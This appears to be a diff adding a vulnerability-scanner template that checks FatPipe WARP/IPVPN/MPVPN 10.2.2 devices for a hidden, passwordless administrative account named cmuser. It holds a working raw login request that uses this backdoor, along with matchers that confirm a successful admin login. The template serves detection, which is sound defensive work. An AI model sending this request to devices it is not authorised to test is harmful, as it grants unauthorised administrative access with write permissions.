@@ -1,0 +1,37 @@
+id: fatpipe-backdoor
+
+info:
+  name: FatPipe Networks WARP/IPVPN/MPVPN 10.2.2 Hidden Backdoor Account
+  author: gy741
+  severity: high
+  description: FatPipe Networks has a hidden administrative account cmuser that has no password and has write access permissions to the device. The user cmuser is not visible in Users menu list of the application.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5684.php
+    - https://www.fatpipeinc.com/support/advisories.php
+  tags: fatpipe,default-login,backdoor,auth-bypass
+
+requests:
+  - raw:
+      - |
+        POST /fpui/loginServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: word
+        words:
+          - '"loginRes":"success"'
+          - '"activeUserName":"cmuser"'
+        condition: and
